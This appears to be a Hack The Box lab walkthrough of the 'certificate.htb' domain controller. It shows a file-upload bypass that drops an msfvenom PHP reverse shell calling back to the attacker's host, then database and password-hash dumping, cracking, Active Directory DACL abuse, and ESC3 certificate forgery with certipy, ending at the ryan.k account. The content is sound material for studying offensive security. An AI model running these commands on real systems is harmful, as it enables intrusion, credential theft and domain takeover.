## HOST RECON

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: FBA180716B304B231C4029637CCF6481
|_http-title: Certificate | Your portal for certification
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-03 01:55:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-03T01:57:09+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-03T01:57:08+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
|_ssl-date: 2025-06-03T01:57:09+00:00; +8h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-03T01:57:08+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T01:56:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m02s, deviation: 0s, median: 8h00m01s
```



## GUESSING WEB FOOTHOLD

1. create student account

2. enroll a course

3. go to some file upload option

4. use this technique and upload php shell https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/

```
└─$ msfvenom -p php/reverse_php lhost=10.10.14.243 lport=1234 -o xeu.php                

└─$ zip shell.zip shell.php

└─$ zip pdfzip.zip some_pdf_file.pdf

└─$ cat pdfzip.zip shell.zip > final.zip
```

5. upload final.zip and access http://certificate.htb/static/uploads/.../shell.php

```
msf6 exploit(multi/handler) > [*] Command shell session 1 opened (10.10.14.243:1234 -> 10.10.11.71:51928) at 2025-06-03 12:43:55 -0400
```


## shell as xamppuser


```
whoami /all

USER INFORMATION
----------------

User Name             SID                                          
===================== =============================================
certificate\xamppuser S-1-5-21-515537669-4223687196-3249690583-1130


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            akeder.kh                Alex.D                   
Aya.W                    Eva.F                    Guest                    
John.C                   Kai.X                    kara.m                   
karol.s                  krbtgt                   Lion.SK                  
Maya.K                   Nya.S                    Ryan.K                   
saad.m                   Sara.B                   xamppuser
```

```
net group 

Group Accounts for \\DC01

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain CRA Managers
*Domain Guests
*Domain Storage Managers
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Finance
*Group Policy Creator Owners
*Help Desk
*HR
*Key Admins
*Marketing
*Protected Users
*Read-only Domain Controllers
*Schema Admins
```

```
type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```
```
C:\xampp\mysql\bin> .\mysql.exe --host=localhost -u certificate_webapp_user --password='cert!f!c@teDBPWD' --database='Certificate_WEBAPP_DB' --execute='show tables;'

Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

```
PS C:\xampp\mysql\bin> .\mysql.exe --host=localhost -u certificate_webapp_user --password='cert!f!c@teDBPWD' --database='Certificate_WEBAPP_DB' --execute='select * from users;'

id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      ZAP     ZAP     ZAP     zaproxy@example.com     $2y$04$JYwgL9qCznr.bAjA1tvPiePnjVb2nJqjJQKOL4GQBeV2Aoq1ZMDu2    2025-06-03 14:43:32     teacher 0
23      matteo  matteo  matteo  matteo@gmail.com        $2y$04$dYTN5VQYhglTpgdtwq4AHuPZBoturZ65qSDUVJJVDw65Vk0A53Im.    2025-06-03 14:45:39     student 1
482     test    test    teachme test@test.com   $2y$04$SSjCkS3QMbLNqaZAfxTHV.OODHp270s2ZaXx6AmPWbWxFI.jM1bD.    2025-06-03 15:12:38     student 1
499     ciao    ciao    test' OR '1'='1 prova@gmail.com $2y$04$i/54/t6NQr.0d.jeXtd.ku42P9M6No8VEY8D3SNFQP28UUdx7BfEC    2025-06-03 15:19:02     student 1
553     ciso    ciao    test' or 1=1; --        ciao@kilop.com  $2y$04$VyYSTtk1MyNnGDFtVKeU4OSwe0zTi4qKqeWi6QPGawo04Uvf3vJKi    2025-06-03 15:21:58     student 1
910     test' or 1=1; --        ciao    ciao11  ciao1333@kilop.com      $2y$04$fZuVRPZHCYUNokrt3z1pGOaqULRoPtd4XFl7eWze1cLe21spo172a    2025-06-03 15:47:44     student 1
911     aaaa    bbbb    test7575        test@example.com        $2y$04$Qypj5juDNtv928JZpz7ec.2mO4rjSpvgb/wlL/jrkVt58XAOyzLau    2025-06-03 15:56:35     student 1
912     alien   verse   alienverse      alienverse@htb.com      $2y$04$aJtQUE9oaB5UhaIz6/vAsupB7aEcggQ3IE/uQ.xrET9SCLMvoevVW    2025-06-03 16:35:45     student 1
913     reshwin rs      reshwin reshwin@gmail.com       $2y$04$/rawnYtmJnHFVZ7.2wPVv.2AAxZdllSixaPyhUIP7KW0cMwD27Z2C    2025-06-03 16:43:31     student 1
914     hacker  hecker  H4cker  hacker@hecker.com       $2y$04$4919VjROAiulU8s5Y/cPaOTlLohjAGeYVcoy6E4o3DEizdIIAbvcG    2025-06-03 16:58:20     student 1
915     robot   rock    robotrock       farfan@gmail.com        $2y$04$sVkn4f4azw2lSzXXOpPPt.zu3dvc2yuV.jq93G.hruTjJgcBItgLa    2025-06-03 17:07:32     student 1
916     xibiu   grandao xibiuzao        xibiu@mail.com  $2y$04$8twdmWsiouNYkyTIMOP0lOq46nXxi5rUfGK805Z.JS0u4w4ILpJWK    2025-06-03 17:40:59     student 1
917     teacher 1       teacher teacher@gmail   $2y$04$feB9O33xb6RJp8L46zt05ehHaFXnNhwR.lZB5x0/1/5wZ7qWf4l0a    2025-06-03 18:12:45     teacher 0
```

```
└─$ john sara_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

Blink182         (?)     
```

## Sara.B creds


#### bh data

- Sara.B ---> memberof ---> Help Desk, Ras and Ias Servers, Account Operators, Domain Cra Managers, Remote Management Users, Remote Desktop Users

- outbound
- 1 - sara.b memberof Account Operators that has GenericAll over all users and group of domain
- 2 - sara.b memberof Ras and Ias Servers that has WriteOwner/WriteDacl over Ras and Ias Servers Access Check container

```
The members of the group RAS AND IAS SERVERS@CERTIFICATE.HTB have the ability to modify the owner of the container RAS AND IAS SERVERS ACCESS CHECK@CERTIFICATE.HTB.

Implicit owner rights are not blocked and are therefore abusable via change in ownership when the following conditions are met:

    Inheritance is not configured for any privileges explicitly granted to the OWNER RIGHTS SID (S-1-3-4). Non-inherited privileges granted to OWNER RIGHTS are removed when the owner is changed, allowing the new owner to have the full set of implicit owner rights.
    The domain's BlockOwnerImplicitRights setting is not in enforcement mode. This setting is defined in the 29th character in the domain's dSHeuristics attribute. When set to 0 or 2, implicit owner rights are not blocked.

    $searcher = [adsisearcher]""
    $searcher.SearchRoot = "LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=EXAMPLE,DC=LOCAL"
    $searcher.SearchScope = [System.DirectoryServices.SearchScope]::Base
    $searcher.Filter = "(objectClass=*)"
    $searcher.PropertiesToLoad.Add("DSHeuristics") | Out-Null
    $result = $searcher.FindOne()
    Write-Output "DSHeuristics: $($result.Properties['DSHeuristics'])"

    The object is not a computer or a derivative of a computer object (e.g., MSA, GMSA).
```

```
ẀINDOWS ABUSE
To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

You may need to authenticate to the Domain Controller as a member of RAS AND IAS SERVERS@CERTIFICATE.HTB if you are not running a process as a member. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):

Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y

Now with ownership of the container object, you may grant yourself the GenericAll permission inherited to child objects

This can be done with PowerShell:

$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
$principalName = "principal"     # SAM account name of principal

# Find the certificate template
$template = [ADSI]"LDAP://$containerDN"

# Construct the ACE
$account = New-Object System.Security.Principal.NTAccount($principalName)
$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
    $sid,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
)
# Add the new ACE to the ACL
$acl = $template.psbase.ObjectSecurity
$acl.AddAccessRule($ace)
$template.psbase.CommitChanges()
```

```
LINUX ABUSE

To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).

owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'

Control of the Container

With ownership of the container object, you may grant yourself the GenericAll permission.

Generic Descendent Object Takeover

The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'

Now, the "JKOHLER" user will have full control of all descendent objects of each type.

Targeted Descendent Object Takeoever

If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this.
```

```
The members of the group RAS AND IAS SERVERS@CERTIFICATE.HTB have permissions to modify the DACL (Discretionary Access Control List) on the container RAS AND IAS SERVERS ACCESS CHECK@CERTIFICATE.HTB

With write access to the target object's DACL, you can grant yourself any permission you want on the object.


WINDOWS ABUSE
With WriteDacl on the container object, you may grant yourself the GenericAll permission inherited to child objects.

This can be done with PowerShell:



$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
$principalName = "principal"     # SAM account name of principal

# Find the certificate template
$template = [ADSI]"LDAP://$containerDN"

# Construct the ACE
$account = New-Object System.Security.Principal.NTAccount($principalName)
$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
    $sid,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
)
# Add the new ACE to the ACL
$acl = $template.psbase.ObjectSecurity
$acl.AddAccessRule($ace)
$template.psbase.CommitChanges()
```

```
LINUX ABUSE
Control of the Container

With WriteDacl to a container object, you may grant yourself the GenericAll permission.

Generic Descendent Object Takeover

The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'

Now, the "JKOHLER" user will have full control of all descendent objects of each type.

Targeted Descendent Object Takeoever

If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this.
```

- Aya.W ---> memeberof ---> Help Desk, Remote Management Users, Remote Desktop Users
  |__ no outbound 

- John.C ---> memeberof ---> Help Desk, Remote Management Users, Remote Desktop Users
  |__ no outbound

- Karol.S ---> ...

- Maya.K ---> memberof ---> Finance

- Saad.M ---> Help Desk, Remote Management Users, Remote Desktop Users

- Akeder.KH ---> memberof ---> Marketing

- Eva.F ---> memberof ---> Domain Cra Managers

- Kai.X ---> memberof ---> Marketing

- Nya.S ---> memberof ---> HR

- Alex.D ---> memberof ---> Domain Cra Managers

- Kara.M ---> memberof ---> HR

- Lion.SK ---> memberof ---> Domain Cra Managers, Remote Management Users

- Ryan.K ---> memberof ---> Remote Management Users, Domain Storage Managers


```
└─$ netexec ldap 10.10.11.71 -u sara.b -p Blink182 --query "(sAMAccountName=sara.b)" ""       

SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.71     389    DC01             [+] certificate.htb\sara.b:Blink182 
LDAP        10.10.11.71     389    DC01             [+] Response for object: CN=Sara,CN=Users,DC=certificate,DC=htb
LDAP        10.10.11.71     389    DC01             objectClass:         top person organizationalPerson user
LDAP        10.10.11.71     389    DC01             cn:                  Sara
LDAP        10.10.11.71     389    DC01             sn:                  Baradek
LDAP        10.10.11.71     389    DC01             userCertificate:     0x3082069e30820586a003...                                                                             
LDAP        10.10.11.71     389    DC01             distinguishedName:   CN=Sara,CN=Users,DC=certificate,DC=htb
LDAP        10.10.11.71     389    DC01             instanceType:        4
LDAP        10.10.11.71     389    DC01             whenCreated:         20241104015444.0Z
LDAP        10.10.11.71     389    DC01             whenChanged:         20250603212909.0Z
LDAP        10.10.11.71     389    DC01             displayName:         Sara Baradek
LDAP        10.10.11.71     389    DC01             uSNCreated:          24788
LDAP        10.10.11.71     389    DC01             memberOf:            CN=Help Desk,CN=Users,DC=certificate,DC=htb CN=Domain CRA Managers,CN=Users,DC=certificate,DC=htb CN=Account Operators,CN=Builtin,DC=certificate,DC=htb CN=RAS and IAS Servers,CN=Users,DC=certificate,DC=htb                                                                                                    
LDAP        10.10.11.71     389    DC01             uSNChanged:          217231
LDAP        10.10.11.71     389    DC01             name:                Sara
LDAP        10.10.11.71     389    DC01             objectGUID:          0xda8eac327a96f44e99089c87b7e29bf9
LDAP        10.10.11.71     389    DC01             userAccountControl:  66048
LDAP        10.10.11.71     389    DC01             badPwdCount:         1
LDAP        10.10.11.71     389    DC01             codePage:            0
LDAP        10.10.11.71     389    DC01             countryCode:         0
LDAP        10.10.11.71     389    DC01             badPasswordTime:     133934722142958318
LDAP        10.10.11.71     389    DC01             lastLogoff:          0
LDAP        10.10.11.71     389    DC01             lastLogon:           133797528884601468
LDAP        10.10.11.71     389    DC01             pwdLastSet:          133751592691889154
LDAP        10.10.11.71     389    DC01             primaryGroupID:      513
LDAP        10.10.11.71     389    DC01             objectSid:           0x010500000000000515000000057bba1e1c5ac0fbd757b2c155040000
LDAP        10.10.11.71     389    DC01             adminCount:          1
LDAP        10.10.11.71     389    DC01             accountExpires:      9223372036854775807
LDAP        10.10.11.71     389    DC01             logonCount:          565
LDAP        10.10.11.71     389    DC01             sAMAccountName:      Sara.B
LDAP        10.10.11.71     389    DC01             sAMAccountType:      805306368
LDAP        10.10.11.71     389    DC01             objectCategory:      CN=Person,CN=Schema,CN=Configuration,DC=certificate,DC=htb
LDAP        10.10.11.71     389    DC01             dSCorePropagationData: 20241127002459.0Z 16010101000000.0Z
LDAP        10.10.11.71     389    DC01             lastLogonTimestamp:  133934583451708512
LDAP        10.10.11.71     389    DC01             mail:                sara.b@certificate.htb
```

#### Winrm Loggin 

```
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> cat Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!

*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap
```

- extract credentials from pcap file
- https://github.com/lgandx/PCredz (false positive admin hash)

- https://github.com/jalvarezz13/Krb5RoastParser.git
```
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
```

## Lion.SK creds

```
*Evil-WinRM* PS C:\Users\Public> download ca.pfx
```

```
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> .\Certify.exe find /vulnerable
Program 'Certify.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\Certify.exe find /vulnerable
```


#### ESC3 Certificate Request Agent EKU

- https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/
- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc3-certificate-agent-eku

```
└─$ certipy find -vulnerable -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71

Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.

  1
    Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Certificate Request Agent
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-03T23:51:13+00:00
    Template Last Modified              : 2024-11-03T23:51:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
    [*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.

``` 

- When a certificate template specifies the Certificate Request Agent EKU, it is possible to use the issued certificate from this template to request another certificate on behalf of any user.

- users to request cert based in directories in machine: Ryan.K or akeder.kh

```
└─$ certipy req -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

```
└─$ certipy req -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser -on-behalf-of ryan.k -pfx lion.sk.pfx
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 26
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

```
└─$ faketime -f +8hr certipy auth -pfx ryan.k.pfx -dc-ip 10.10.11.71 -domain certificate.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

## Ryan.K creds

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
certificate\ryan.k S-1-5-21-515537669-4223687196-3249690583-1117


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFICATE\Domain Storage Managers        Group            S-1-5-21-515537669-4223687196-3249690583-1118 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
